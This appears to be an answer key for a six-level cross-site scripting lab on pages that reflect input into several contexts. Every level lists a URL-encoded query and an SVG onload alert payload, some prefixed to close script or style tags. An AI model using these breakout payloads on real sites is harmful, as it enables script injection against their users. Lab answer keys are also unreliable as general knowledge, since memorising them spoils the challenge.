# polyctx — solutions

Multiple reflection contexts on one page; any single context suffices.

### polyctx-level1

`/polyctx/level1/?query=%3Csvg%20onload%3Dalert(1)%3E`

- payload: `<svg onload=alert(1)>`
- context: dual body + input value; body context triggers tag

### polyctx-level2

`/polyctx/level2/?query=%3C%2Fscript%3E%3Csvg%20onload%3Dalert(1)%3E`

- payload: `</script><svg onload=alert(1)>`
- context: dual script string + body; close script then inject

### polyctx-level3

`/polyctx/level3/?query=%3Csvg%20onload%3Dalert(1)%3E`

- payload: `<svg onload=alert(1)>`
- context: triple reflect (comment + attr + body); body executes tag

### polyctx-level4

`/polyctx/level4/?query=%3Csvg%20onload%3Dalert(1)%3E`

- payload: `<svg onload=alert(1)>`
- context: single-pass script tag strip; svg unaffected

### polyctx-level5

`/polyctx/level5/?query=%3C%2Fscript%3E%3Csvg%20onload%3Dalert(1)%3E`

- payload: `</script><svg onload=alert(1)>`
- context: dual JS single-quoted + HTML attr; script close wins

### polyctx-level6

`/polyctx/level6/?query=%3C%2Fstyle%3E%3Csvg%20onload%3Dalert(1)%3E`

- payload: `</style><svg onload=alert(1)>`
- context: style tag + body div; close style then inject
